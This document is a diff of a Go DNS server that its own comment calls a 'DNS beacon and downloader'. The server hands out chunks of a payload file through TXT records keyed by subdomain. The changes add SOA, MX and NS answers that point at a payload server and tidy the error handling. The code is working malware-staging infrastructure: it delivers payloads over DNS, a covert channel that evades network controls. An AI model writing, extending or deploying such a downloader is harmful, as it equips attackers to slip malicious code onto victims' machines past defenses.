@@ -8,12 +8,12 @@ import (
 	"io/ioutil"
 	"log"
 	"strconv"
-	"strings"
 
 	"github.com/miekg/dns"
 )
 
 const payloadFile = "payload.bin"
+const payloadDns = "ns.domain.com"  // The payload server DNS address.
 const domain = "domain.com"
 const port = ":5553"
 
@@ -48,32 +48,60 @@ type handler struct{}
 // DNS beacon and downloader.
 func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := dns.Msg{}
+	name := r.Question[0].Name
+	recType := r.Question[0].Qtype
+
 	msg.SetReply(r)
 
-	switch r.Question[0].Qtype {
-	case dns.TypeNS:
-		log.Printf("NS request for %s\n", r.Question[0].Name)
+	log.Printf("%s request for %s\n", dns.TypeToString[recType], name)
 
-		rr, err := dns.NewRR(fmt.Sprintf("%s NS ns.%s", r.Question[0].Name, domain))
+	switch r.Question[0].Qtype {
+	case dns.TypeSOA:
+		rr, err := dns.NewRR(fmt.Sprintf("%s 300 SOA %s %s 2015013001 86400 7200 604800 300", name, name, payloadDns))
 		if err != nil {
+			log.Println(err)
+			return
+		}
+
+		msg.Answer = append(msg.Answer, rr)
+
+	case dns.TypeMX:
+		rr, err := dns.NewRR(fmt.Sprintf("%s MX 10 %s", name, payloadDns))
+		if err != nil {
+			log.Println(err)
+			return
+		}
+
+		msg.Answer = append(msg.Answer, rr)
+
+	case dns.TypeNS:
+		rr, err := dns.NewRR(fmt.Sprintf("%s NS %s", name, payloadDns))
+		if err != nil {
+			log.Println(err)
 			return
 		}
 
 		msg.Answer = append(msg.Answer, rr)
 
 	case dns.TypeTXT:
-		log.Printf("TXT request for %s\n", r.Question[0].Name)
+		if _, ok := dns.IsDomainName(name); !ok {
+			log.Println("Invalid domain name")
+			return
+		}
 
-		key := strings.Split(r.Question[0].Name, ".")[0]
+		key := dns.SplitDomainName(name)[0]
 		val, ok := chunks[key]
 		if !ok {
 			val = ""
 		}
 
 		rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", r.Question[0].Name, val))
-		if err == nil {
-			msg.Answer = append(msg.Answer, rr)
+		if err != nil {
+			log.Println(err)
+			return
 		}
+
+		msg.Answer = append(msg.Answer, rr)
 	}
 
 	w.WriteMsg(&msg)
